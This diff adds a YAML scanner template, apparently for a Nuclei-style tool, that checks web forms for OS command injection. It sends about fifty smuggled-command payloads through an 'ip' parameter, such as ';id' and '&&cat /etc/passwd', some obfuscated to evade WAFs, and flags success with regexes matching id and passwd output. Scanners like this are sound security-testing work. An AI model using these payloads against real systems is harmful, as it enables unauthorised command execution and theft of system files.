@@ -1,0 +1,95 @@
+
+id: command-injection
+
+info:
+  name: Command Injection Template
+  author: suriryuk
+  severity: Critical
+  description: Determine whether a command injection attack was successful.
+  tags: RCE, cmdi
+
+http:
+  - pre-condition:
+    - type: dsl
+      dsl:
+        - "method == POST"
+        - "len(body) > 0"
+      condition: and
+
+  - raw:
+    - |
+      POST {{BaseURL}} HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+
+      ip={{injection}}&Submit=Submit
+
+    payloads:
+      injection:
+        - "###cat$u /e${h}tc/${p}asswd ###"
+        - "||id"
+        - "id |"
+        - "%3Bid"
+        - "<id>"
+        - "%7Cid%20"
+        - ";id|"
+        - "||id|"
+        - "%26cat%20/etc/passwd"
+        - "|id"
+        - "%7B%7Dcat%20/etc/passwd%7D"
+        - "cat /e${hahaha}tc/${heywaf}pas${catchthis}swd"
+        - ";cat+/etc/passwd"
+        - ";id"
+        - "%7Ccat+/etc/passwd"
+        - "%26%2Bid"
+        - "id;"
+        - "id"
+        - ";id|"
+        - "%7Bcat,/etc/passwd%7D"
+        - "id"
+        - "& id"
+        - "id\\n"
+        - "%27id%27"
+        - "%26id%24"
+        - "&cat$u /e$\\ttc/\\pas$\\tswd"
+        - "%26%20id"
+        - "id"
+        - "cat%20/etc/passwd"
+        - "%24%28id%29"
+        - "%60id;"
+        - "%60id%60"
+        - "%28cat%2520/etc/passwd%29"
+        - "a;/usr/bin/id;#"
+        - ";cat /etc/passwd"
+        - "%3Bid"
+        - ";id"
+        - "%26cat%20/etc/passwd%3C"
+        - "%28%20cat%2520%2Fetc%24%7Bhahaha%7Dpasswd%29"
+        - "%2A%20id%22"
+        - "id;"
+        - ";id|"
+        - "%0Acat%20/etc/passwd"
+        - "%22%20cat%24IFS/etc/passwd%3F"
+        - "%7Ccat+/etc/passwd"
+        - "%22id%22"
+        - "%7C%0Awhoami%0A%7C%0A"
+        - "id"
+        - "%24%28cat%20%2Fe%24u%2Fetc%2Bpas%24e%29"
+        - "&&cat /etc/passwd"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: regex
+        name: attack-success
+        regex:
+          - "uid=[^\\n]+ gid=[^\\n]+ groups=[^\\n]+"
+          - "root:x:[0-9]+:[0-9]+:root:\\/root:"
+          - "root:\\*:[0-9]+:[0-9]+:[0-9]+:[0-9]+:::"
+
+      - type: word
+        name: attack-success-id
+        words:
+          - "www-data"
+        part: body
+        
